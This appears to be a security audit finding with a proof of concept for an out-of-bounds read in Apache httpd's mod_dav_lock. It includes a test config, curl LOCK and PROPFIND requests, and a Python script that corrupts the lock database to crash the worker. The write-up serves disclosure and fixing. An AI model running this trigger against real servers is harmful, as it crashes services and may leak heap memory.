# 038 - mod_dav_lock direct record fixed-field copy without bounds check

`modules/dav/lock/locks.c:511` copies `sizeof(dp->f)` bytes out of a
DBM-fetched value without confirming that many bytes remain. A
truncated `DAV_LOCK_DIRECT` record produces an out-of-bounds read in
the worker.

## Setup

Minimum config exposing a generic-lock DAV resource. `mod_dav_lock`
defaults to a SDBM-backed lock database that we can corrupt directly:

```apache
# tmp/httpd.conf
ServerRoot   /tmp/apache-httpd-2.4.66
Listen       127.0.0.1:8080
LoadModule   mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule   authz_core_module modules/mod_authz_core.so
LoadModule   dav_module modules/mod_dav.so
LoadModule   dav_lock_module modules/mod_dav_lock.so
DavLockDB    /tmp/poc-dav/locks
DocumentRoot /tmp/poc-dav/htdocs
<Directory /tmp/poc-dav/htdocs>
  Dav On
  Require all granted
</Directory>
```

```bash
mkdir -p /tmp/poc-dav/htdocs
chown -R "$(id -u)" /tmp/poc-dav
```

## Trigger

Take a real lock to materialize the DBM files, then overwrite the
stored value with a one-byte truncated direct-lock record.

```bash
curl -X PUT -d hi http://127.0.0.1:8080/f
LOCKBODY='<?xml version="1.0"?>
<D:lockinfo xmlns:D="DAV:">
  <D:lockscope><D:exclusive/></D:lockscope>
  <D:locktype><D:write/></D:locktype>
  <D:owner>poc</D:owner>
</D:lockinfo>'
curl -X LOCK -d "$LOCKBODY" \
  -H 'Content-Type: text/xml' \
  http://127.0.0.1:8080/f
```

Now corrupt the lock database. SDBM stores values keyed by the
canonical resource hash; we just truncate every value to a single
`DAV_LOCK_DIRECT` (`0x01`) byte:

```python
# tmp/corrupt_locks.py
import dbm.ndbm as ndbm
db = ndbm.open('/tmp/poc-dav/locks', 'w')
for k in list(db.keys()):
    db[k] = b'\x01'
db.close()
```

```bash
python3 tmp/corrupt_locks.py
curl -i -X PROPFIND -H 'Depth: 0' \
  -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:prop><D:lockdiscovery/></D:prop></D:propfind>' \
  http://127.0.0.1:8080/f
```

Run the server under ASan for a clean signal:

```bash
CFLAGS="-fsanitize=address -g" ./configure --enable-dav --enable-dav-lock
make && ./httpd -X -f tmp/httpd.conf
```

## Observed effect

`dav_generic_load_lock_record()` enters the `DAV_LOCK_DIRECT` branch
with `offset == 1` and `val.dsize == 1`. The unchecked
`memcpy(dp, val.dptr + offset, sizeof(dp->f))` reads
`sizeof(dav_lock_discovery_fixed)` bytes (typically 24-32) past the
end of the SDBM-returned datum.

Under ASan the request returns `500 Internal Server Error` and the
error log contains:

```
==12345==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 32 at 0x... in dav_generic_load_lock_record
```

Without ASan, the worker either crashes (`SIGSEGV`) or returns an
inconsistent `lockdiscovery` body, depending on what bytes follow the
SDBM allocation in the heap.
